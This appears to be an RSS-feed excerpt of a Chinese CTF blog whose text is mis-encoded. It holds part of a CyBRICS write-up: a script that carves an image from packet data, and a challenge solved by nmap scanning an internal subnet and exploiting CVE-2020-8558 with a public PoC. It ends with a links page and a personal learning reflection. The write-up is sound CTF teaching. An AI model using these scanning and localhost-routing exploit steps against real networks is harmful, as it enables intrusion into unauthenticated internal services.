&lt;span style="color:#111">udp_bytes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">bytearray&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">fromhex&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">find&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ffd8ffdb&amp;#39;&lt;/span>&lt;span style="color:#111">):])&lt;/span>
&lt;span style="color:#111">file_out&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;out_files/&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">count&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;_packet.jpg&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;wb&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">file_out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">udp_bytes&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/235_packet.jpg" alt="235_packet">&lt;/p>
&lt;p>&lt;del>æ”¾å¤§ å†æ”¾å¤§ æ¯ä¸€æ ¹&lt;/del> æœ€åçš„flagæ˜¯ &lt;code>cybrics{Lost_Secrets_In_The_AIr}&lt;/code>&lt;/p>
&lt;h2 id="localhost-network-hard-267-pts">localhost (Network, Hard, 267 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Vlad Roskov (&lt;a href="https://t.me/mrvos">@mrvos&lt;/a>)&lt;/p>
&lt;p>Remember NET fleeks? Iâ€™ve pwned a box in another corporate network, and there is some peculiarly configured server near my foothold. Take a look.&lt;/p>
&lt;pre tabindex="0">&lt;code>ssh localhost@109.233.61.10
Password: ohx7eeQu
&lt;/code>&lt;/pre>&lt;p>Your team token &amp;gt; Sw0T5cecsfJfaKApOiKzsA&lt;/p>
&lt;/blockquote>
&lt;p>å…ˆsshè¿ä¸Šçœ‹çœ‹æƒ…å†µï¼ˆå›¾ä¸­æœ‰ä¸€å¥å‘½ä»¤è¾“é”™äº† åº”è¯¥æ˜¯routes ç•™ä¸‹äº†è‹±è¯­ä¸å¥½çš„æ³ªæ°´&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729122432345.png" alt="image-20210729122432345">&lt;/p>
&lt;p>è‡ªå¸¦python2 python3 nmapï¼Œå¹¶ä¸”æœ¬èº«å°±æ˜¯rootèº«ä»½ï¼Œæ‰«ä¸€ä¸‹å†…ç½‘ç½‘æ®µ&lt;code>nmap -sS -Pn 10.193.10.7/24&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729131318834.png" alt="image-20210729131318834">&lt;/p>
&lt;p>å‘ç°10.193.10.180çš„80ç«¯å£å¼€æ”¾ï¼Œç”¨curlè®¿é—®&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729131419115.png" alt="image-20210729131419115">&lt;/p>
&lt;p>æç¤º&lt;em>Flag-containing-Records&lt;/em> æ¥ç€è®¿é—®ä¸¤ä¸ªè¶…é“¾æ¥çš„å†…å®¹&lt;/p>
&lt;p>&lt;code>curl 10.193.10.180/redis.conf&lt;/code>æ˜¯redisçš„é…ç½®æ–‡ä»¶ï¼Œå‡ ä¹æ‰€æœ‰çš„å†…å®¹éƒ½æ˜¯è¢«æ³¨é‡Šæ‰çš„ç¤ºä¾‹å†…å®¹ï¼Œæœ‰ç”¨çš„å°±å†…å®¹å¹¶ä¸å¤šï¼š&lt;/p>
&lt;pre tabindex="0">&lt;code>bind 127.0.0.1
protected-mod yes
port 6379
&lt;/code>&lt;/pre>&lt;p>&lt;code>curl 10.193.10.180/sysctl.conf&lt;/code>ä¹Ÿæ˜¯ç›¸å…³çš„é…ç½®æ–‡ä»¶ åªæœ‰ä¸€å¥æ²¡è¢«æ³¨é‡Š&lt;/p>
&lt;pre tabindex="0">&lt;code>net.ipv4.conf.all.route_localnet=1
&lt;/code>&lt;/pre>&lt;p>æŸ¥googleï¼Œå‘ç°äº†è¿™äº›ï¼š&lt;a href="https://github.com/kubernetes/kubernetes/issues/90259">net.ipv4.conf.all.route_localnet=1 opens security issue #90259&lt;/a> | &lt;a href="https://github.com/tabbysable/POC-2020-8558">POC-2020-8558&lt;/a>&lt;/p>
&lt;p>æ˜¯ä¸€ä¸ªå»å¹´çˆ†å‡ºçš„cveï¼Œå…·ä½“çš„å†…å®¹ æˆå› ä»¥åŠèƒŒæ™¯çŸ¥è¯†ä¸å¤šèµ˜è¿° ä¸Šé¢çš„é“¾æ¥ä¸­å†™çš„å¾ˆè¯¦ç»†ï¼Œè¿™é‡Œæ‘˜å–å‡ æ®µï¼š&lt;/p>
&lt;blockquote>
&lt;p>In order to allow host processes to access NodePort services via the 127.0.0.1(localhost) address, kube-proxy sets the &lt;code>net.ipv4.conf.all.route_localnet=1&lt;/code> sysctl setting. According to the kernel documentation, this setting makes the kernel &amp;ldquo;not consider loopback addresses as martian&amp;rdquo; &amp;ndash; a consequence of which is that they could be accessed by other nodes on the network. That&amp;rsquo;s a big deal if you have sensitive unauthenticated services whose only protection is being bound to localhost!&lt;/p>
&lt;p>&amp;hellip;&amp;hellip;&lt;/p>
&lt;p>A normal node will never transmit a packet with a destination address of 127.0.0.1, because of RFC 1122. If a normal node receives a packet with a destination address of 127.0.0.1, it will ignore (drop) it, again because of RFC 1122. Setting &lt;code>net.ipv4.conf.all.route_localnet=1&lt;/code> changes that &amp;ndash; it allows 127.0.0.1 packets to be sent and received as if they were not special.&lt;/p>
&lt;p>So, if an attacker has a local connection to a target node with &lt;code>net.ipv4.conf.all.route_localnet=1&lt;/code>, the attacker can send it a packet with 127.0.0.1 as the destination address, and that target node will respond appropriately as if 127.0.0.1 were a totally normal address. The two most common ways to have a local connection to a target node today are to be on the same Ethernet network (broadcast domain) as the target, or to be a container running on the target.&lt;/p>
&lt;p>Note that when normally configured, Linux will not allow the attacker node to transmit normal packets destined for 127.0.0.1. This can be worked-around by reconfiguring the attacker&amp;rsquo;s Linux node (if they have root access), or by forging packets using a raw socket. Raw sockets require only the Linux kernel capability CAP_NET_RAW, which is given by default to unprivileged containers. This means that an attacker-controlled unprivileged container is capable of exploiting CVE-2020-8558.&lt;/p>
&lt;/blockquote>
&lt;p>ï¼ˆä¸å¾—ä¸è¯´ipv4å½“åˆæŠŠæ•´ä¸ª&lt;code>127.0.0.0/8&lt;/code>çš„åœ°å€éƒ½ç»™äº†æœ¬åœ°å›ç¯ç”¨çœŸçš„æ˜¯å¤ªæ…·æ…¨äº†&amp;hellip;&amp;hellip; åˆ°ipv6å°±åªæœ‰ä¸€ä¸ª&lt;code>:: 1&lt;/code>&lt;/p>
&lt;p>åœ¨è¿™é‡Œç›´æ¥ç”¨pocæ‰“å³å¯ï¼Œå…³äºtest.pyå’Œpoc.pyè¿™é‡Œä¹Ÿæ‘˜å–ä¸€ä¸‹è¯´æ˜&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>tst-2020-8558.py&lt;/strong>
Simple Python script to test for CVE-2020-8558 by sending raw packets. This could be a scapy oneliner, but I wanted to add a little bit more of the comforts of home. It sends a packet to &lt;code>127.0.0.1&lt;/code> via your target, and looks to see if there is a reply.&lt;/p>
&lt;p>&lt;strong>poc-2020-8558.py&lt;/strong>
Python script to exploit CVE-2020-8558 by allowing ordinary TCP or UDP client applications to communicate with a remote localhost IP via forged packets. Run this script, then use any normal TCP or UDP client (e.g. kubectl or nc) to connect to your fakedestination (198.51.100.1 by default).
Note that the fakedestination needs to be an IP address that never responds to packets and your route to it must be over the same interface as you access your target. In the usual case, both fakedestination and target will be accessible via your default gateway interface, and this will be no big deal.
Because this script uses raw sockets to send and receive the &amp;ldquo;localhost&amp;rdquo; packets, it works fine inside a normal unprivileged container.&lt;/p>
&lt;/blockquote>
&lt;p>å› ä¸ºéœ€è¦nc æ‰€ä»¥å¦å¼€ä¸€ä¸ªshell&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729153443403.png" alt="image-20210729153443403">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729153501930.png" alt="image-20210729153501930">&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://jan.show/?p=128">wp&lt;/a> | &lt;a href="https://www.zhihu.com/question/49866806">ä¸ºä»€ä¹ˆæ•´ä¸ª127.*ç½‘æ®µéƒ½è¢«æ‹¿æ¥å½“åšç¯å›åœ°å€äº†ï¼Ÿ&lt;/a>&lt;/p>
&lt;hr>
&lt;p>æœ¬äººæ¯”è¾ƒèœï¼Œåªåšå‡ºæ¥äº†ç­¾åˆ°é¢˜å’Œå‡ ä¸ªwebï¼Œå…¶ä½™å‡ä¸ºèµ›åå¤ç›˜ï¼Œ&lt;a href="https://mp.weixin.qq.com/s/SQ-DGvug-P6PK-s3qkJVdw">æ­¤å¤„æ˜¯å‚è€ƒwp&lt;/a>&lt;/p>
&lt;p>é“é˜»ä¸”é•¿å‘€ï¼Œæš‘å‡è¦å¥½å¥½åŠªåŠ›å’¯ (ã¤Ğ´âŠ‚)
å‚ç…§ä¸€äº›æ•™ç¨‹æŠŠç®€å•çš„åšå®¢ä¹Ÿæ­èµ·æ¥äº†ï¼Œä»¥åè¦æŠŠè¿™ä¸ªå°çªæ…¢æ…¢ä¸°å¯Œèµ·æ¥(ã‚âˆ€ï½¥)â˜†&lt;/p></description></item><item><title>Friends</title><link>https://amiaaaz.github.io/friends/</link><pubDate>Tue, 27 Jul 2021 14:37:22 +0800</pubDate><guid>https://amiaaaz.github.io/friends/</guid><description>&lt;p>æ¬¢è¿äº’æ¢å‹é“¾ï¼ï¼æ¬¢è¿æ‰©åˆ—å¹æ°´ï¼ï¼!&lt;/p>
&lt;p>á••(á›)á•—&lt;/p>
&lt;hr>
&lt;ul>
&lt;li>&lt;a href="https://eeeeeeeeeeeeeeeea.cn/">eeee&lt;/a> - V&amp;amp;NçŸ¥åç”·é…® - pwn&lt;/li>
&lt;li>&lt;a href="http://d33b4t0.com/">deebato&lt;/a> - crypto&lt;/li>
&lt;/ul></description></item><item><title>ä¸€ç‚¹å°å°çš„æ€»ç»“ï¼ˆ</title><link>https://amiaaaz.github.io/2021/07/22/0920-0721-summary/</link><pubDate>Thu, 22 Jul 2021 18:27:39 +0800</pubDate><guid>https://amiaaaz.github.io/2021/07/22/0920-0721-summary/</guid><description>&lt;p>æ—¶é—´é£é€ï¼Œä¸€çœ¨çœ¼è¿›å…¥å¤§å­¦å·²ç»å¿«ä¸€å¹´äº†ï¼Œä½†æ—¶å¸¸è§‰å¾—æŠ¥é“å…¥æ ¡å°±åœ¨æ˜¨å¤©ã€‚&lt;/p>
&lt;p>å»å¹´12æœˆå¼€å§‹æ¥è§¦åˆ°ctfï¼Œ0åŸºç¡€ï¼Œæ¯å‘¨æœ«åšä¸€åšctfhubçš„æŠ€èƒ½æ ‘ï¼Œå½“æ—¶å¯¹æ•´ä¸ªè®¡ç®—æœºä¸–ç•Œç®—æ˜¯å®Œå…¨å°ç™½ é‡åˆ°ä¸€ä¸ªåè¯å°±è¦æŸ¥ä¸€æŸ¥ä»€ä¹ˆæ„æ€ï¼Œç»å¸¸æ˜¯çœ‹ä¸ªåŠå¤©è¿˜æ˜¯ä¸€çŸ¥åŠè§£ï¼Œåšé¢˜ä¹Ÿåªèƒ½æœºæ¢°çš„é‡å¤ä¸€ä¸‹æœåˆ°çš„wpé‡Œçš„æ­¥éª¤ï¼Œæœ‰æ ·å­¦æ ·ã€‚ä¹Ÿå°±åšæŒäº†1ä¸ªæœˆï¼Œå°±å¼€å§‹å¤ä¹ æœŸæœ«è€ƒè¯•â†’è€ƒè¯•â†’æ”¾å‡ï¼Œå¯’å‡ç®—æ˜¯åœ¨å®¶é‡Œèººè¿‡å»çš„ï¼Œæ¯å¤©å®…ç€çœ‹çœ‹å‰§ åˆ·åˆ·æ‰‹æœºï¼Œç¢Œç¢Œæ— ä¸ºçš„ä»€ä¹ˆéƒ½ä¸æƒ³å¹²ï¼›ä¸´è¿‘å¼€å­¦äº†ï¼Œæ‰å¦‚æ¢¦åˆé†’èˆ¬çš„æ‚”æ‚Ÿï¼Œçœ‹äº†ä¸¤æœ¬ä¹¦ï¼Œæ£é¼“äº†ä¸‹æ‰‹æœºï¼Œæµ…æµ…åœ°äº†è§£äº†ä¸€ä¸‹å®‰å“çš„åˆ·æœºå’Œææœºçš„ç›¸å…³çŸ¥è¯†ã€‚&lt;/p>
&lt;p>ä¸‰æœˆåº•æ­£å¼å¼€å­¦ï¼Œå››æœˆåˆå¼€å§‹æŠŠâ€œè’åºŸâ€çš„ctfé¢˜ç»§ç»­æ¡èµ·æ¥ï¼Œä»ä¹‹å‰çš„æ¯å‘¨æœ«åšåšé¢˜å˜æˆäº†æ¯å¤©æ™šä¸Šéƒ½æ‹¿å‡ºæ—¶é—´æ¥å­¦ä¹ ã€‚å½“æ—¶è™½ç„¶å¯¹å®‰å…¨è¿˜æ˜¯æ‡µæ‡‚çš„è®¤è¯†ï¼Œä½†æ˜¯æˆ‘çš„ç›´è§‰å‘Šè¯‰æˆ‘è¿™å°±æ˜¯æˆ‘çš„çˆ±å¥½ï¼Œæ˜¯èƒ½å¸¦æ¥æˆå°±æ„Ÿå’Œå¿«ä¹çš„ä¸œè¥¿ï¼Œæˆ‘æ„¿æ„èŠ±æ—¶é—´å»ç¢ç£¨å®ƒã€‚ä¹Ÿæ˜¯å››æœˆï¼Œçœ‹äº†ã€Šç½‘ç»œæ˜¯æ€æ ·è¿æ¥çš„ã€‹ã€Šå›¾è§£httpã€‹å’Œã€Šå›¾è§£tcp/ipã€‹ï¼Œæ­£å¼çš„äº†è§£äº†ä¸€ä¸‹è®¡ç½‘ï¼ˆè™½ç„¶ä¹Ÿåªæ˜¯ä¸ªå…¥é—¨ï¼‰ï¼›åšå®Œctfhubçš„webéƒ¨åˆ†ä¹‹åï¼Œä¹Ÿç®—æ˜¯å¯¹ctfé‡Œwebéƒ¨åˆ†çš„åŸºæœ¬ç±»å‹éƒ½è§è¿‡äº†ï¼Œå¼€å§‹åœ¨buuojä¸ŠçœŸæ­£åšä¸€äº›ctfçš„é¢˜ã€‚&lt;/p>
&lt;p>ç„¶è€Œåˆ°çœŸæ­£åˆ°åšctfé¢˜çš„æ—¶å€™å‘ç°è‡ªå·±åˆæ˜¯é‚£æ ·çš„æ¸ºå°ï¼Œæ‹¿åˆ°ä¸€é“é¢˜ä¹Ÿåªèƒ½æŠ“åŒ…ã€æ‰«ç›®å½•ï¼Œå¥½ä¸€ç‚¹çš„èƒ½æ‹¿åˆ°æ³„éœ²çš„æºç ï¼Œå¯æ˜¯åˆ°ä»£ç å®¡è®¡åˆæ˜¯å®Œå…¨çš„ç¨€çƒ‚ï¼Œjsä¸ä¼šçœ‹ phpä¸ä¼šçœ‹ javaæ›´ä¸ä¼šçœ‹ï¼Œç”šè‡³è¿å¤æ‚ä¸€ç‚¹çš„pythonä¹Ÿä¸ä¼šçœ‹ï¼Œä¸€ä¸ªç±»å‹çš„é¢˜ ç¨å¾®å˜ä¸ªèŠ±æ · æ‹ä¸ªå¼¯å°±åˆçœ‹ä¸æ‡‚äº†ï¼Œä¸€å‰¯ç—›è‹¦é¢å…·ï¼›ç°åœ¨å›è¿‡å¤´æ¥çœ‹ å¾ˆåº†å¹¸å½“æ—¶å³ä½¿é‡åˆ°äº†ç§ç§é—®é¢˜ä¹Ÿæ²¡æ‰“é€€å ‚é¼“ï¼Œæ²¡è§è¿‡çš„å‡½æ•°å°±å»æœæ–‡æ¡£ çœ‹ç”¨æ³•ï¼Œæ²¡è§è¿‡çš„çŸ¥è¯†ç‚¹å°±å»æœç›¸å…³èµ„æ–™ï¼Œçœ‹ä¸æ‡‚çš„é¢˜å°±å¤šçœ‹å‡ ä¸ªä¸åŒçš„wp ç„¶åå¤ç° ç”¨è‡ªå·±çš„è¯å†æ•´ç†å‡ºæ¥ æ‰“å¥½tagæ”¾åˆ°notionä¸Šã€‚&lt;/p>
&lt;p>å¾ˆå¿«åˆ°äº†äº”æœˆï¼Œäº”æœˆåˆæŠŠè€æ—§åšé‡çš„ç”µè„‘æ¢æ‰äº†ï¼Œæ–°ä¸Šæ‰‹çš„è£…å¤‡æå‡äº†ä¸å°‘å­¦ä¹ çš„èˆ’é€‚æ„Ÿï¼›è¿™æ®µæ—¶é—´ä¹Ÿå¤¹æ‚ç€åšäº†ä¸€ç‚¹burpsuite portswiggerçš„é¢˜ï¼ˆè¿™å—åšçš„ä¸å¤ªæ‰å®ï¼Œè€Œä¸”å½“æ—¶åšçš„æ—¶å€™æ²¡æœ‰ç”¨å›¾åºŠ ç¬”è®°é‡Œçš„å›¾ç‰‡ä¹Ÿéƒ½ä¸¢æ‰äº† ä¹‹åå¾—å›è¿‡å¤´æ¥é‡æ–°çœ‹çœ‹ï¼‰ï¼Œä¹Ÿå¤¹æ‚åšäº†å‡ ä¸ªå•ç‹¬ç±»å‹çš„é¶åœºï¼›ç„¶åæ˜¯ä¸¤å‘¨éš¾ç†¬çš„å†›è®­ã€‚è™½ç„¶å†›è®­éš¾ç†¬ï¼Œä½†æ˜¯è¿‡çš„çœŸçš„å¾ˆå¿«ä¹ã€‚è¿™é‡Œå°±æ˜¯æ‡‚çš„éƒ½æ‡‚äº†ï¼Œä¸è¯¦è¯´ã€‚å¼€å¿ƒå¿«ä¹çš„å‡ ä¸ªæœˆï¼Œæˆ‘å°†æ°¸è¿œé“­è®°ã€‚&lt;/p>
&lt;p>å†›è®­å›æ¥ä»¥åå°±å…­æœˆäº†ï¼Œç®—æ˜¯è¿›å…¥æ­£è½¨ï¼Ÿä¸çŸ¥é“è¿™æ ·è¯´æ˜¯ä¸æ˜¯å¾ˆåˆé€‚ï¼Œå¯¹å¾ˆå¤šé¢˜ç›®ä¹Ÿæ˜¯ä¸€å›ç”Ÿ äºŒå›ç†Ÿï¼Œä»ä¸€å¼€å§‹çš„å®Œå…¨ä¸çŸ¥é“ä»å“ªé‡Œä¸‹æ‰‹åˆ°ç¨å¾®èƒ½åˆ†æä¸€ç‚¹ï¼ˆè™½ç„¶è¿˜æ˜¯ä¸èƒ½è„±ç¦»wpç‹¬è‡ªè¡Œèµ°ï¼‰ï¼Œå¯èƒ½å¯¹äºä¸€äº›æœ‰å¤©èµ‹çš„å¤§ä½¬æ¥è¯´è¿™äº›è½»è½»æ¾æ¾ï¼Œæˆ‘å¯èƒ½èŠ±å‡ ä¸ªå°æ—¶èƒ½ææ‡‚çš„ä¸œè¥¿åªéœ€è¦åˆ«äººä¸€ä¸ªå°æ—¶èƒ½ç†è§£é€ï¼Œä½†æ˜¯æˆ‘å·²ç»å¾ˆæ»¡æ„äº†ï¼Œé‚£å¥è¯æ€ä¹ˆè¯´ï¼Ÿâ€œè¿›ä¸€å¯¸æœ‰ä¸€å¯¸çš„æ¬¢å–œâ€ï¼Œæˆ–è®¸å°±æ˜¯è¿™æ ·å§ï¼Œè™½ç„¶æ¯å¤©æ˜¯ç¬¨æ‹™åœ°å­¦ç€ï¼Œä½†ä¹Ÿå¼€å¿ƒã€‚&lt;/p>
&lt;p>ä¹Ÿæ˜¯å…­æœˆä¹‹åï¼Œå¼€å§‹å…³æ³¨æ¼æ´ã€æ¸—é€ã€æ”»é˜²ç­‰ç­‰å®‰å…¨æ–¹é¢æ ¸å¿ƒå‘çš„ä¸€äº›ä¸œè¥¿ï¼Œå¼€å§‹æ¯å¤©æŠ½å‡ºæ—¶é—´çœ‹å®‰å…¨ç±»çš„å…¬ä¼—å·æ–‡ç« ï¼Œä¸€å¼€å§‹åªæ˜¯ä¸æ˜è§‰å‰â€”â€”å“‡ è™½ç„¶çœ‹ä¸æ‡‚æ˜¯åœ¨å¹²ä»€ä¹ˆ ä½†æ˜¯å¥½nb å¥½å‰å®³ï¼Œçœ‹çš„å¤šäº†ä¸€ç‚¹ä»¥åå¼€å§‹æ…¢æ…¢æ˜ç™½é‚£äº›é«˜å¤§ä¸Šçš„åè¯æ˜¯ä»€ä¹ˆæ„æ€ï¼ŒåŸæ¥ç½‘ç»œå®‰å…¨çš„ä¸–ç•Œæ˜¯é‚£ä¹ˆè®©äººç€è¿·ã€‚ä¹Ÿå¼€å§‹æ­£å¼æ¥è§¦ctfæ¯”èµ›ï¼ˆè™½ç„¶ä¹Ÿå°±æ˜¯è¿›å»ç­¾ä¸ªåˆ°çš„æ°´å¹³â€¦â€¦ï¼‰ï¼Œå¼€å§‹åšvulnhubçš„é¶æœºï¼Œå¼€å§‹å¤ç›˜ä¹‹å‰åšè¿‡çš„é¢˜ï¼Œæ…¢æ…¢çš„ æ—å¾åšå¼• ä¸€ç‚¹ç‚¹çš„ä¸°å¯ŒçŸ¥è¯†ä½“ç³»ã€‚&lt;/p>
&lt;p>ç°åœ¨å·²ç»æ˜¯7æœˆä¸­æ—¬äº†ï¼Œå¾ˆå¿«å°±è¦ä»å¤§ä¸€çš„èœé¸¡å˜ä¸ºå¤§äºŒçš„èœé¸¡äº†ï¼Œå›é¡¾è¿™ä¸€å¹´çš„å­¦ä¹ å’Œç”Ÿæ´»ä¹Ÿæ˜¯æ„Ÿæ…¨è‰¯å¤šã€‚æ»¡æ‰“æ»¡ç®—ï¼Œæ¥è§¦å®‰å…¨æ˜¯ä¸åˆ°å››ä¸ªæœˆå§ï¼Œç®—æ˜¯ä¹Ÿä¸çŸ­äº†ï¼Œå¯æ˜¯è®¤çœŸæ‹ä¸€ä¸‹æ•´ä¸ªçš„è¿‡ç¨‹ åˆæ˜¯æ¼æ´ç™¾å‡ºâ€”â€”ä»£ç å®¡è®¡èƒ½åŠ›ç¨€çƒ‚ï¼Œç»å¸¸åˆ†æä¸å‡ºæ¥é—®é¢˜æ‰€åœ¨çš„åœ°æ–¹ï¼›é€»è¾‘é“¾æ¡ä¸€é•¿çš„é¢˜ç›®å°±æ€ç»´å‘†æ» æ€»æ˜¯ä¼šä¸‹æ„è¯†åœ°æƒ³æ”¾å¼ƒ è¿™çœŸçš„ä¸æ˜¯ä¸ªå¥½ç°è±¡ï¼›sqliå’Œuploadç±»çš„é¢˜åšäº†ä¸å°‘ï¼Œä½†è¿˜æ˜¯ä¸èƒ½è‡ªå·±ç‹¬ç«‹çš„ å®Œå…¨ä¸å‚è€ƒåˆ«äººçš„wpå®Œæˆä¸€æ•´ä¸ªåˆ†æè¿‡ç¨‹ï¼›å¯¹äºpythonçš„æŒæ¡ä¸å¤Ÿå¥½ï¼Œæ˜æ˜¾ååº”åœ¨ä»»ä½•éœ€è¦ç¼–å†™pyè„šæœ¬çš„é¢˜ç›®ä¸Šï¼›å¯¹ä¸€äº›çŸ¥è¯†ç‚¹â€”â€”ä¸è¯´ä¸€äº›äº†ï¼Œå¯ä»¥è¯´æ˜¯å…¨éƒ¨çš„ä¸œè¥¿çš„äº†è§£å’Œè®¤è¯†éƒ½è¿˜æ˜¯æµ…å°è¾„æ­¢ï¼Œåœç•™åœ¨çº¸é¢ä¸Šçš„èŠ±æ¶å­ï¼Œæ¯”å¦‚ååºåˆ—åŒ– æ¯”å¦‚ç›®å½•éå†ï¼Œè„‘å­é‡Œåªèƒ½è¯´æœ‰ä¸ªæ®‹å­˜çš„å°è±¡ å¯çœŸæ­£ç»™æˆ‘ä¸ªè¿™æ ·çš„é¢˜ è¿˜æ˜¯ä¸èƒ½è¯´è½»æ¾ä¸Šæ‰‹ï¼Œç”šè‡³æ˜¯å¯¹ä¸€äº›æ¦‚å¿µè¿˜ç†ä¸æ¸…æ¥šï¼Œå­¦çš„ä¸œè¥¿å¯èƒ½çœ‹èµ·æ¥æ˜¯æœ‰ä¸ªæ ·å­ ä½†æˆ‘å¿ƒé‡Œæ¸…æ¥š å·®çš„è¿˜å¤ªè¿œå¤ªè¿œï¼Œç”šè‡³å®Œå…¨æ²¡æœ‰åˆ°èƒ½è‡ªä¿¡çš„è·Ÿåˆ«äººè¯´â€œæˆ‘åœ¨å­¦ctf æˆ‘åœ¨å­¦å®‰å…¨â€çš„ç¨‹åº¦ã€‚&lt;/p>
&lt;p>å­¦ä¸åŠ¨çš„æ—¶å€™ç»å¸¸ä¼šçœ‹å¤§ä½¬çš„åšå®¢ï¼Œçœ‹çœ‹åˆ«äººçš„å­¦ä¹ ç»å†æ˜¯ä»€ä¹ˆæ ·çš„ã€‚ä¹‹å‰è¿˜ä¼šæ‹¿å¹´é¾„åšè‡ªæˆ‘å¼€è„±çš„å€Ÿå£ï¼Œè¿˜å°ï¼Œè¿˜æ—©ï¼Œè¿˜éƒ½æ¥å¾—åŠï¼Œå¯æ˜¯è¶Šå­¦ è¶Šå‘ç°è¦å»ç‚¹äº®çš„æŠ€èƒ½æ ‘è¶Šæ˜¯æç¹å¶èŒ‚ï¼Œåšåšçš„æ ‘å† ä»¿ä½›è¦é®å¤©è”½æ—¥èˆ¬â€”â€”è¦å­¦java æé«˜ä»£ç å®¡è®¡èƒ½åŠ› å¸¸è§çš„æ¼æ´ç±»å‹è¦åšåˆ°å¿ƒé‡Œæœ‰æ•°ï¼Œè¦æŠŠä¹‹å‰åšè¿‡çš„é¢˜å¤šæ¸©ä¹  å¤šæƒ³å¤šç»ƒå¤šçœ‹ï¼Œè¦åšåˆ°çœŸæ­£çš„æŒæ¡çŸ¥è¯† è€Œä¸æ˜¯è®°ä½è¿™ä¸ªä¸œè¥¿å«ä»€ä¹ˆ å¾’æœ‰å…¶è¡¨ï¼Œè¦å¤šå†™å†™ä»£ç  å†™ä»£ç çš„åŸºæœ¬åŠŸå¤ªå·®é‚£è‚¯å®šæ˜¯èµ°ä¸è¿œï¼Œæœ€æ„Ÿå…´è¶£çš„æ¸—é€å’Œæ¼æ´æ–¹é¢çš„ä¸œè¥¿æ›´è¦å¤šçœ‹ å¯ä»¥æœ¬åœ°å¤ç°çš„ä¸è¦æ‡’ï¼›å³ä¾¿å¦‚æ­¤ï¼Œä¹Ÿæœ‰ä¸å°‘é˜³å…‰èƒ½å¤Ÿç©¿é€æ ‘å¶äº¤å ä¹‹å¤„ï¼Œæ¸©æš–çš„æ´’è½ã€‚å¯èƒ½æˆ‘çœŸçš„ä¸æ˜¯æ‰€è°“çš„å¤©èµ‹å‹é€‰æ‰‹ï¼Œåªä¸è¿‡æ˜¯ä¸‡åƒå¹³å¹³æ— å¥‡çš„æ™®é€šäººä¹‹ä¸€ï¼Œå­¦ä¹ èƒ½åŠ›ä¹Ÿå°±æ˜¯ä¸ªä¸­ç­‰æ°´å¹³ï¼Œä½†æ˜¯æˆ‘ç›¸ä¿¡é‡å˜å¼•èµ·è´¨å˜ï¼Œç›¸ä¿¡æŒä¹‹ä»¥æ’çš„åŠªåŠ›ä¼šå¸¦æ¥æ”¹å˜ï¼Œæ›´ä½•å†µè¿™è¿˜æ˜¯æˆ‘éå¸¸å–œæ¬¢çš„äº‹æƒ…ï¼›å¯èƒ½æˆ‘å³ä½¿åŠªåŠ›å››å¹´ ä¹Ÿè¾¾ä¸åˆ°é‚£äº›å¤§ä½¬åŠå¹´å°±èƒ½è¾¾åˆ°çš„é«˜åº¦ï¼Œä½†æ˜¯ä¸é‡è¦ å­¦ä¹ å˜› å°±æ˜¯ä¸ä¼šæ‰è¦å­¦ï¼Œå°±ç®—å­¦ä¸ä¼šä¹Ÿä¸æ˜¯ä»€ä¹ˆä¸¢äººçš„äº‹æƒ…ï¼Œæ—¥æ‹±ä¸€å’ï¼ŒåŠŸä¸å”æã€‚&lt;/p>
